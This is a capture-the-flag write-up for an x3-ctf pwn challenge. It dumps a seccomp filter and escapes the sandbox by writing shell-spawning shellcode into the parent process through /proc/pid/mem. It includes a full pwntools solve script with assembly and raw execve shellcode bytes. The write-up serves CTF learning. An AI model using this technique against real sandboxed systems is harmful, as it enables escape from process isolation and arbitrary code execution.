# x3-ctf Secure-sandbox

## Recon

in this challenge we get the opportunity to execute a shellcode of our choice in a child process with seccomp enabled

by running `seccomp-tools` we can see what we can use

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0012
 0006: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0012
 0007: 0x15 0x04 0x00 0x00000003  if (A == close) goto 0012
 0008: 0x15 0x03 0x00 0x00000008  if (A == lseek) goto 0012
 0009: 0x15 0x02 0x00 0x00000014  if (A == writev) goto 0012
 0010: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0012
 0011: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0013
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

so we we can use:
- write
- open
- close
- lseek
- writev
- exit
- exit_group

but no read, we can't do open read write for flag
Also in the first 4 lines we can see the arch check and x32 abi check is there

## Exploitation

Forunately for us, on executing the chall file it gives us the PID for the parent process before forking.
This is a very meaningful leak since, using `/proc/{pid}/mem` we can change the memory of the parent process

it's possible to edit the parent's memory from child since they belong to same group and the chall file is probably being run as root.

So using `open` we first open `/proc/{pid}/mem`
i saw it in use in this [writeup](http://jgeralnik.github.io/writeups/2020/09/05/writeonly/)
Then we can use `lseek` to get out cursor to the area where `puts` function is, since after executing the shellcode we execute the puts function.
After that we can use `write` to wrtite our shellcode where `puts` is

and finally we'll get the shell

the [solve script](solve.py)

```python
from pwn import *

context.arch = 'amd64'
r = process(["./chall"])
#r = remote("3a1c5799-2da8-4f8e-8562-890c0ed98533.x3c.tf",31337,ssl=True)
r.recvuntil(b':')
pid = int(r.recvline().strip(),10)

pl = asm(f'''
        xor edx,edx
        mov esi,0x1
        lea rdi,[rip+stuff]
        mov rax,0x2
        syscall
        mov rdi,rax
        mov rsi,0x421a80
        xor rdx,rdx
        mov rax,0x8
        syscall
        mov rdi,0x3
        lea rsi,[rip+shellcode]
        mov rdx,0x100
        mov rax,0x1
        syscall
        ret
        stuff:
                .string "/proc/{pid}/mem"
        shellcode:
                .byte 0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62
                .byte 0x69, 0x6e, 0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54, 0x5f,0x6a,0x3b,0x58,0x99,0x0f,0x05

'''
)
print(pl)
context.terminal=['st']

#gdb.attach(r,'''b *setup_sandbox+0x14d''')

r.send(pl)
r.interactive()
```

